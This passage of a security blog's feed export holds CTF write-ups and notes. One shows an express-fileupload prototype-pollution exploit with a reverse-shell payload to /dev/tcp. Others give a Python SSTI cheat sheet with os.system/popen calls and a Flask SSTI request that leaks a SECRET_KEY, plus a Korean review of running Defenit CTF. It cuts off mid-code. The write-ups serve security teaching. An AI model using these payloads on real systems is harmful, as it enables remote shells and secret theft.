class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">221</span></span><br><span class="line"></span><br><span class="line">----------<span class="number">1566035451</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;__proto__.outputFunctionName&quot;</span>;</span><br><span class="line"></span><br><span class="line">x;process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/p6.is/8888 0&gt;&amp;1&quot;&#x27;</span>);x</span><br><span class="line">----------<span class="number">1566035451</span>--</span><br></pre></td></tr></table></figure><p>So first, we’re going to pollute the <code>Object.prototype.outputFunctionName</code> using the <code>prototype pollution</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: p6.is:7777</span><br></pre></td></tr></table></figure><p>and calls template function of ejs.</p><p><img src="/img/2020/07/image-20200729104502663.png" alt="image-20200729104502663"></p><p>Then we can get the shell !<br>If all the process can be represented by python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/p6.is/8888 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://p6.is:7777&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://p6.is:7777&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/richardgirges/express-fileupload/issues/236">https://github.com/richardgirges/express-fileupload/issues/236</a></li><li><a href="https://www.npmjs.com/package/express-fileupload">https://www.npmjs.com/package/express-fileupload</a></li><li><a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs">https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Real-world-JS-1&quot;&gt;&lt;a href=&quot;#Real-world-JS-1&quot; class=&quot;headerlink&quot; title=&quot;Real-world JS 1&quot;&gt;&lt;/a&gt;Real-world JS 1&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Real-
      
    
    </summary>
    
    
      <category term="Docs" scheme="https://blog.p6.is/category/docs/"/>
    
    
  </entry>
  
  <entry>
    <title>Review of 2020 Defenit CTF</title>
    <link href="https://blog.p6.is/Review-of-2020-Defenit-CTF/"/>
    <id>https://blog.p6.is/Review-of-2020-Defenit-CTF/</id>
    <published>2020-06-08T08:43:21.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1060">https://ctftime.org/event/1060</a></li></ul><img src="/img/iu.jpeg" style="display:none"><p><img src="/img/2020/06/defenit_ctf4.png" alt="defenit_ctf4"></p><blockquote><p>Defenit에서 2020년 6월 5일 18시부터, 7일 18시까지 처음으로 CTF를 호스팅 하였습니다.<br>이번 대회는 사실 처음부터 예정에 있던 것이 아니었습니다.</p></blockquote><p><img src="/img/2020/06/defenit_ctf5.png" alt="defenit_ctf5"></p><blockquote><p>대회 운영금을 어떻게 구해야 할까 고민해 보았지만, 마땅한 답이 나오지 않았습니다.<br>사비를 내어 통해 최소한의 사이즈로 진행하려던 것이 처음 계획이었지만,<br>많은 분들의 후원 덕분에 높은 수준으로 진행될 수 있었습니다. 감사합니다.</p></blockquote><h2 id="Website-Development"><a href="#Website-Development" class="headerlink" title="Website Development"></a>Website Development</h2><blockquote><p>문제 출제에 앞서서 생각보다 준비해야 할 것들이 많았는데, 가장 신경썼던 것중의 하나는 플랫폼을 제작하는 것이었습니다.<br><code>CTFd</code>나 <code>mellivora</code> 도 분명 훌륭한 플랫폼이지만, 장기적으로 보면 자체적인 플랫폼을 개발하여 운영하는 쪽이 나을 것이라고 판단했습니다.</p></blockquote><blockquote><p>개발은 제가 프론트엔드, 03sunf 님이 백엔드를 담당하여 작업하였는데<br>총 작업 기간으로 잡은 것은 두달이었지만<br>개인적인 사정으로 앞의 한달정도는 거의 하지 못했고<br>남은 한달의 기간동안 개발을 진행하게 되었습니다.<br>웹 사이트가 방문자들에게 주는 첫인상에 많은 영향을 끼칠 것이라는 생각에<br>양산형 CTF에서 느껴질 수 있는 저렴한 느낌을 최대한 배제하기 위해 신경 썼습니다.<br>결과적으로 레트로 스타일의 테마와, 무려 모바일과 PC 모두를 지원하고, 예쁜 스코어보드를 가진(!) 플랫폼이 완성되었습니다.</p></blockquote><p><img src="/img/2020/06/defenit_ctf3.png" alt="defenit_ctf3"></p><h2 id="Registering-Event"><a href="#Registering-Event" class="headerlink" title="Registering Event"></a>Registering Event</h2><blockquote><p>아무래도 CTF를 개최하게 되면, 일반적인 팀으로서는 홍보할 곳이 마땅치 않습니다.<br>때문에 홍보를 CTFTime에 의존할 수 밖에 없는데<br>CTFTime에 이벤트 등록 시 필수적으로 들어가는 정보는<br>여기에 CTF명, 디스크립션, 로고, URL 입니다.</p></blockquote><blockquote><p>해당 정보는 등록된 후에도 수정이 가능한데<br>등록 신청을 하고 승인되기까지 이틀 정도가 소요되었습니다.</p></blockquote><p><img src="/img/2020/06/defenit_ctf6.png" alt="defenit_ctf6"></p><h2 id="Registering-CTF"><a href="#Registering-CTF" class="headerlink" title="Registering CTF"></a>Registering CTF</h2><blockquote><p>승인이 되고 나면, 이제는 이번에 개최할 이벤트의 상세 정보를 등록해야 합니다.<br>여러가지 정보와 더불어 ctftime 엔드포인트를 등록하는 란이 있어서<br><code>/api/ctftime</code> 주소에 만들어서 등록했는데, 사실 별로 쓸모는 없었던 것 같습니다.<br>CTF 등록신청을 하고 승인까지는 다시 이틀 정도가 소요되었습니다.</p></blockquote><p><img src="/img/2020/06/defenit_ctf4.png" alt="defenit_ctf4"></p><h2 id="Weight"><a href="#Weight" class="headerlink" title="Weight"></a>Weight</h2><blockquote><p>CTFTime 에서는 처음으로 진행되는 이벤트의 경우에는, 아무리 고득점을 받아도 Weight는 25점이 최대입니다.<br>19년도의 Hitcon의 레이팅이 92점이라는 것을 생각해보면, 아직 앞으로 갈 길이 먼것 같습니다.</p></blockquote><h2 id="Making-Challenges"><a href="#Making-Challenges" class="headerlink" title="Making Challenges"></a>Making Challenges</h2><blockquote><p>문제 출제는 상당히 매끄럽지 못했습니다<br>참가자 분들에게서 많은 칭찬을 받기도 했지만<br>사실은 교차 검증도 부족했고, 시간에 쫒겨가며 문제를 만들었습니다.</p><p>아무래도 출제자가 많다 보니 관리하는게 극도로 힘들었습니다.<br>와중에 플랫폼도 만들고 제 문제도 출제하면서<br>회사일에 주변에 부가적인 업무도 어쩐지 계속 생기는 터라<br>약간 어지러울 정도였는데, @Jsec이 많이 신경써줘서 이만큼 나왔던 것 같습니다.</p></blockquote><blockquote><p>분야별 문제 개수 배분도 좋지 못했습니다.<br>Rev, Pwn 은 괜찮은 수준이었지만<br>Misc + Osint 문제 수가 일반적인 CTF 와 비교하면 과도한 탓에<br>노력해 보았지만, 끝내 지적을 받고 말았습니다.</p></blockquote><blockquote><p>개인적으로도 CTF 플랫폼에 너무 힘을 줬기 때문에, 출제에 별로 힘을 쓰지 못했습니다.<br>3문제를 실제로 출제한 기간은 2주 정도였고, 덕분에 많은 언인텐 풀이가 있었습니다.</p></blockquote><blockquote><p>웹 문제는 총 5개였고, 그 중 4개를 출제했는데 사실 여기에는 비하인드 스토리(…)가 존재합니다.<br>대회 +24h 까지만 해도 웹 문제는 4개였는데, babyjs 를 출제하고 나서<br>터무니없이 간단하게 언인텐이 발생하였기 때문에</p></blockquote><blockquote><p>대회가 22시간 남은 시점부터 새로운 문제를 만들게 되었고<br>다행스럽게도 +32h 릴리즈 타임에 출제가 가능했습니다.<br>네, 이게 <code>Adult JS</code> 입니다.</p></blockquote><blockquote><p>이전에 교차 검증을 철저히 했으면 이런일이 없었을 테지만, 다들 시간에 쫒기는 탓에<br>제대로 점검하지 못했습니다. 이것은 고쳐야 할 점이겠지요.<br>내년에는 준비기간을 2배 이상 늘릴 생각입니다.</p></blockquote><p><img src="/img/2020/06/defenit_ctf8.png" alt="defenit_ctf8"></p><h2 id="Scoring"><a href="#Scoring" class="headerlink" title="Scoring"></a>Scoring</h2><blockquote><p>36c3의 스코어링 방식을 채택했고 만족스럽게 동작했습니다.<br>survey 문제에 한정해서 스태틱 방식의 스코어링이 이루어졌으면<br>더 좋았을 거라고 생각되어 내년 적용을 생각하고 있습니다.</p></blockquote><h2 id="Period"><a href="#Period" class="headerlink" title="Period"></a>Period</h2><blockquote><p>48시간 대회를 기획했고 KST(+9) 기준으로<br>금요일 오후 6시부터 일요일 오후 6시까지 진행했습니다<br>그러나 대회 시작 시간과, 기간 모두 적절하지 못했다고 생각합니다.</p></blockquote><blockquote><p>저희에게 금요일 오후 6시였지만 일부 유럽에서는<br>그 시작 시간이 목요일 아침이었기에, 참여가 굉장히 어려웠으리라 뒤늦게 알게 되었습니다.<br>내년에는 다른 타임존까지 고려해서, 온전히 주말에만 진행될 수 있도록 할 생각입니다.</p></blockquote><blockquote><p>시간도 아마 36h쪽이 더 적절했을 것이라고 생각합니다.</p></blockquote><h2 id="Server-Management"><a href="#Server-Management" class="headerlink" title="Server Management"></a>Server Management</h2><blockquote><p>서버를 어떻게 구성할지에 대한 고민을 많이 했습니다.<br>최근에 털렸던 여타 서버와 같은 일이 벌어지지 않도록<br>최대한 안전한 시스템을 만들고자 했고<br>따라서 모든 문제에 도커를 적용하도록 강제했습니다.</p></blockquote><blockquote><p>분명 도커 사용에 익숙하지 않은 팀원이 있었지만,<br>결과적으로는 모든 문제 서버에 적용했고<br>덕분에 해당 출제자가 부재중이더라도, 간단한 서버 관리가 가능했습니다.</p></blockquote><blockquote><p>Web서버와 Osint서버도 기본적으로는 같지만<br>포트스캐닝을 통해서 문제가 릴리즈 전에 노출되는 상황을 방지하기 위해서<br>리버스 프록시 용도로 Nginx 를 두어 호스트 기반 검증을 거쳤습니다.</p></blockquote><blockquote><p>대회 중에 서버가 사망하는 일이 종종 있는데<br>최대한 빠르게 대처할 수 있도록 15초마다 동작하는 헬스체크 봇을 만들어<br>문제 발생시, 서버에 대한 정보를 메일로 받아볼 수 있게 하였습니다.</p></blockquote><blockquote><p>이는 확실히 도움이 됐지만, 메일보다는 디스코드 봇 쪽이 더 좋았을 것이라고 생각합니다.<br>아무래도 메일은 알림을 끄기 쉽지 않고, 소통 채널이 분할되어 버리니까요.</p></blockquote><h2 id="Server-Allocation"><a href="#Server-Allocation" class="headerlink" title="Server Allocation"></a>Server Allocation</h2><blockquote><p>각 서버당 최소 1문제 ~ 4문제 정도를 수용하도록 했습니다.<br>성능 문제로 이상이 생기는 것을 최대한 회피하고자<br>요구치보다 다소 높은 서버를 사용 하였고<br>가격 절감을 위해 Aws &#x2F; GCloud 가 아닌 Vultr 을 이용하였습니다.</p></blockquote><h3 id="141-164-47-140"><a href="#141-164-47-140" class="headerlink" title="141.164.47.140"></a>141.164.47.140</h3><code><ul><li><p>Configuration</p><ul><li>Linux &#x2F; 2 Core CPU + 4GB RAM + 80GB SSD</li></ul></li><li><p>Purpose</p><ul><li>CTF Website Production Server</code></li></ul></li></ul><h3 id="141-164-59-78"><a href="#141-164-59-78" class="headerlink" title="141.164.59.78"></a>141.164.59.78</h3><code><ul><li><p>Configuration</p><ul><li>Linux &#x2F; 2 Core CPU + 4GB RAM + 80GB SSD</li><li>문제 유출 가능성을 없애기 위해, 화이트리스트 방식으로 차단을 수행하였습니다.</li></ul></li><li><p>Purpose</p><ul><li>CTF Website Development Server</code></li></ul></li></ul><h3 id="141-164-60-123"><a href="#141-164-60-123" class="headerlink" title="141.164.60.123"></a>141.164.60.123</h3><code><ul><li><p>Configuration</p><ul><li>Linux &#x2F; 4 Core CPU + 8GB RAM + 160GB SSD</li></ul></li><li><p>Purpose</p><ul><li>Warmup (Pwn)</li><li>Base64 Encoder (Pwn)</li><li>ORVVM (Pwn)</li><li>Persona (Pwn)</code></li></ul></li></ul><h3 id="141-164-60-159"><a href="#141-164-60-159" class="headerlink" title="141.164.60.159"></a>141.164.60.159</h3><code><ul><li><p>Configuration</p><ul><li>Linux &#x2F; 4 Core CPU + 8GB RAM + 160GB SSD</li></ul></li><li><p>Purpose</p><ul><li>Variable Machine (Pwn)</li><li>Error program (Pwn)</li><li>BitBit (Pwn)</li></ul></li></ul></code><h3 id="141-164-39-92"><a href="#141-164-39-92" class="headerlink" title="141.164.39.92"></a>141.164.39.92</h3><code><ul><li><p>Configuration</p><ul><li>Linux &#x2F; 8 Core CPU + 32GB Ram + 640GB SSD</li></ul></li><li><p>Purpose</p><ul><li>Input Test Driver (Pwn)</li></ul></li></ul></code><h3 id="141-164-60-163"><a href="#141-164-60-163" class="headerlink" title="141.164.60.163"></a>141.164.60.163</h3><code><ul><li><p>Configuration</p><ul><li>Linux &#x2F; 4 Core CPU + 8GB RAM + 160GB SSD</li></ul></li><li><p>Purpose</p><ul><li>Highlighter (Web)</li><li>Fortune Cookie (Web)</li><li>Tar Analyzer (Web)</li></ul></li></ul></code><h3 id="45-63-124-33"><a href="#45-63-124-33" class="headerlink" title="45.63.124.33"></a>45.63.124.33</h3><code><ul><li><p>Configuration</p><ul><li>Windows Server 2016 &#x2F; 2 Core CPU + 4GB RAM + 80GB SSD</li><li>한국 Vultr 리전에서는 지원하지 않으므로 유일한 일본 서버입니다.</li></ul></li><li><p>Purpose</p><ul><li>Babyjs (Web)</li></ul></li></ul></code><h3 id="141-164-59-254"><a href="#141-164-59-254" class="headerlink" title="141.164.59.254"></a>141.164.59.254</h3><code><ul><li><p>Configuration</p><ul><li>Linux &#x2F; 4 Core CPU + 8GB RAM + 160GB SSD</li></ul></li><li><p>Purpose</p><ul><li>Puzzle (Misc)</li><li>QR Generator (Misc)</li><li>Executor (Misc)</code></li></ul></li></ul><h3 id="141-164-60-154"><a href="#141-164-60-154" class="headerlink" title="141.164.60.154"></a>141.164.60.154</h3><code><ul><li><p>Configuration</p><ul><li>Linux &#x2F; 4 Core CPU + 8GB RAM + 160GB SSD</li></ul></li><li><p>Purpose</p><ul><li>Minesweeper (Misc)</li><li>Dodge (Misc)</li><li>Hack The C2 (Osint)</code></li></ul></li></ul><h3 id="141-164-60-138"><a href="#141-164-60-138" class="headerlink" title="141.164.60.138"></a>141.164.60.138</h3><code><ul><li><p>Configuration</p><ul><li>Linux &#x2F; 4 Core CPU + 8GB RAM + 160GB SSD</li></ul></li><li><p>Purpose</p><ul><li>Simple SPN (Crypto)</li><li>Hash Chungdol (Crypto)</li><li>What Browser do I use (Forensic)</li></ul></li></ul></code><h2 id="Website"><a href="#Website" class="headerlink" title="Website"></a>Website</h2><blockquote><p>react + backend api 형태로 개발된 플랫폼은<br>높은 성능을 보여주었지만, 400팀에서 1000팀 정도를 상정한 스트레스 테스트를 통해<br>scoreboard 엔드포인트에서 엄청난 부하가 걸리고 있다는 것을 깨달았습니다.<br>이후에 캐시를 사용하도록 패치를 수행하였고<br>1000팀 접속에도 견딜 수 있는 플랫폼을 완성할 수 있었습니다.</p></blockquote><blockquote><p>본래라면 플래그 인증 후에 폭죽이 터지는 등의 효과를 넣으려고 했지만<br>여유가 없어서 구현하지 못하고, alert으로 대체해버린 점 아쉽게 생각하고 있습니다.</p></blockquote><p><img src="/img/2020/06/defenit_ctf7.png" alt="defenit_ctf7"></p><h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="babyjs"><a href="#babyjs" class="headerlink" title="babyjs"></a>babyjs</h3><blockquote><p>본래 30솔브 정도를 예상했지만,<br>언인텐에 처참히 무너져 47솔브를 기록했습니다, 반성하고 있습니다. 😥</p></blockquote><h3 id="fortune-cookie"><a href="#fortune-cookie" class="headerlink" title="fortune cookie"></a>fortune cookie</h3><blockquote><p>본래 15솔브 정도를 예상했고, 정확히 15솔브를 기록했습니다.<br>친숙한 이름 덕분에 가장 쉬워 보였던 건지<br>이 문제와 관련한 질문이 가장 많이 들어왔고 힌트 요청 또한 정말정말 많이 들어와서<br>정신적인 스트레스 요인이었습니다.</p></blockquote><h3 id="Highlighter"><a href="#Highlighter" class="headerlink" title="Highlighter"></a>Highlighter</h3><blockquote><p>3솔브를 예상했고, 4솔브를 기록한 문제입니다.<br>예상보다 상위권 팀들이 열심히 풀어준 덕분인 것 같습니다.<br>이것도 솔브수에 비해 언인텐이 좀 있어서 아쉽지만, 나름 괜찮았습니다.</p></blockquote><h3 id="AdultJS"><a href="#AdultJS" class="headerlink" title="AdultJS"></a>AdultJS</h3><blockquote><p>babyjs 언인텐에 충격받고 급하게 제조하게 된 문제입니다.<br>당초에는 1솔브 정도를 예상했는데, 남은 16시간 중 8시간이 지나도록 소식이 들리지 않아서<br>결국 분석 난이도를 대폭 감소시키고 힌트 폭탄을 던졌습니다.<br>덕분에 Highlighter 보다 높은 5 솔브를 기록하였습니다.</p></blockquote><h2 id="Sponsor"><a href="#Sponsor" class="headerlink" title="Sponsor"></a>Sponsor</h2><blockquote><p>여러 기업에 후원 요청을 넣었고<br>Theori, ENKI에서 응답해 주셨습니다.<br>덕분에 30&#x2F;10&#x2F;5 에 불과하던 상금을 100&#x2F;30&#x2F;10으로 대폭 상승시킬 수 있었습니다.<br>또한 약간은 부담스러운 후원 요구에도 도움을 준 zer0pts 팀에도 감사합니다.</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ctftime.org/event/1060&quot;&gt;https://ctftime.org/event/1060&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&quot;/img/iu.jpeg&quot; style=&quot;display:none&quot;
      
    
    </summary>
    
    
      <category term="Docs" scheme="https://blog.p6.is/category/docs/"/>
    
    
  </entry>
  
  <entry>
    <title>Python SSTI, Exploitable Classes</title>
    <link href="https://blog.p6.is/Python-SSTI-exploitable-classes/"/>
    <id>https://blog.p6.is/Python-SSTI-exploitable-classes/</id>
    <published>2020-04-17T02:12:04.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>This document is continuously updated.</p></blockquote><h2 id="Useful-Classes"><a href="#Useful-Classes" class="headerlink" title="Useful Classes"></a>Useful Classes</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">_frozen_importlib._ModuleLock</span><br><span class="line">_frozen_importlib._DummyModuleLock</span><br><span class="line">_frozen_importlib._ModuleLockManager</span><br><span class="line">_frozen_importlib._installed_safely</span><br><span class="line">_frozen_importlib.ModuleSpec</span><br><span class="line">_frozen_importlib_external.FileLoader</span><br><span class="line">_frozen_importlib_external._NamespacePath</span><br><span class="line">_frozen_importlib_external._NamespaceLoader</span><br><span class="line">_frozen_importlib_external.FileFinder</span><br><span class="line">codecs.IncrementalEncoder</span><br><span class="line">codecs.IncrementalDecoder</span><br><span class="line">codecs.StreamReaderWriter</span><br><span class="line">codecs.StreamRecoder</span><br><span class="line">os._wrap_close</span><br><span class="line">_sitebuiltins._Printer</span><br><span class="line">types.DynamicClassAttribute</span><br><span class="line">types._GeneratorWrapper</span><br><span class="line">warnings.WarningMessage</span><br><span class="line">warnings.catch_warnings</span><br><span class="line">contextlib._GeneratorContextManagerBase</span><br><span class="line">contextlib._BaseExitStack</span><br></pre></td></tr></table></figure><h2 id="Using-os-wrap-close"><a href="#Using-os-wrap-close" class="headerlink" title="Using os._wrap_close"></a>Using os._wrap_close</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;This document is continuously updated.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;Useful-Classes&quot;&gt;&lt;a href=&quot;#Useful-Classes&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="Docs" scheme="https://blog.p6.is/category/docs/"/>
    
    
      <category term="SSTI" scheme="https://blog.p6.is/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>Zer0pts CTF 2020</title>
    <link href="https://blog.p6.is/zer0pts-CTF-2020/"/>
    <id>https://blog.p6.is/zer0pts-CTF-2020/</id>
    <published>2020-03-09T09:22:11.000Z</published>
    <updated>2022-10-14T13:04:25.649Z</updated>
    
    <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1006">https://ctftime.org/event/1006</a></li></ul><p><img src="/img/2020/03/image-20200309084922019.png" alt="image-20200309084922019"></p><p>일본의 <strong>zer0pts</strong> 팀에서 주관한 CTF입니다.</p><h2 id="332pts-notepad-1st-solve"><a href="#332pts-notepad-1st-solve" class="headerlink" title="[332pts] notepad (1st solve)"></a>[332pts] notepad (1st solve)</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/zer0pts/notepad_d0fde3493051f54a1a2286bf40e948c0.tar.gz">notepad.tar.gz</a></li></ul><blockquote><p>This notepad is more useful than Windows one, right?</p></blockquote><p>Flask SSTI and pickle Unserialize 를 주제로 한 문제입니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Automatically go back when page is not found &quot;&quot;&quot;</span></span><br><span class="line">    referrer = flask.request.headers.get(<span class="string">&quot;Referer&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> referrer <span class="keyword">is</span> <span class="literal">None</span>: referrer = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_url(referrer): referrer = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    </span><br><span class="line">    html = <span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;3;URL=&#123;&#125;&quot;&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;&#x27;</span>.<span class="built_in">format</span>(referrer)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html), <span class="number">404</span></span><br></pre></td></tr></table></figure><p>404 페이지 렌더링에 사용되는 <code>page_not_found</code> 함수에서는 Referer 값을 인자로 하여 문자열을 구성해<br>flask의 <code>render_template_string</code> 함수로 전달하고 있습니다.</p><p>따라서 SSTI 에 취약하며, <code>&#123;&#123;"&#123;\&#123;config&#125;\&#125;"&#125;&#125;</code> 값을 삽입하는 것으로 서버의 시크릿 키을 알아낼 수 있습니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// Request</span><br><span class="line">GET /x HTTP/1.1</span><br><span class="line">Host: 3.112.201.75:8001</span><br><span class="line">Referer: http://3.112.201.75:8001/?&#123;&#123;config&#125;&#125;</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">// Response</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;3;URL=http://3.112.201.75:8001/?&lt;Config &#123;&#x27;ENV&#x27;: &#x27;production&#x27;, &#x27;DEBUG&#x27;: False, &#x27;TESTING&#x27;: False, &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None, &#x27;SECRET_KEY&#x27;: b&#x27;\\\xe4\xed&#125;w\xfd3\xdc\x1f\xd72\x07/C\xa9I&#x27;, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(31), &#x27;USE_X_SENDFILE&#x27;: False, &#x27;SERVER_NAME&#x27;: None, &#x27;APPLICATION_ROOT&#x27;: &#x27;/&#x27;, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;SESSION_COOKIE_DOMAIN&#x27;: False, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;SESSION_COOKIE_SAMESITE&#x27;: None, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: datetime.timedelta(0, 43200), &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: None, &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;JSON_AS_ASCII&#x27;: True, &#x27;JSON_SORT_KEYS&#x27;: True, &#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;: False, &#x27;JSONIFY_MIMETYPE&#x27;: &#x27;application/json&#x27;, &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;MAX_COOKIE_SIZE&#x27;: 4093, &#x27;BOOTSTRAP_USE_MINIFIED&#x27;: True, &#x27;BOOTSTRAP_CDN_FORCE_SSL&#x27;: False, &#x27;BOOTSTRAP_QUERYSTRING_REVVING&#x27;: True, &#x27;BOOTSTRAP_SERVE_LOCAL&#x27;: False, &#x27;BOOTSTRAP_LOCAL_SUBDOMAIN&#x27;: None&#125;&gt;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>Page not found. Redirecting...<span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>위와 같은 요청을 통해 <code>SECRET_KEY</code> 가 <code>b&#39;\\\xe4\xed&#125;w\xfd3\xdc\x1f\xd72\x07/C\xa9I&#39;</code>라는 것을 알아냈으므로, session 값을 자유롭게 조작할 수 있습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">...</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/note/&lt;int:nid&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">notepad</span>(<span class="params">nid=<span class="number">0</span></span>):</span><br><span class="line">    data = load()</span><br><span class="line">    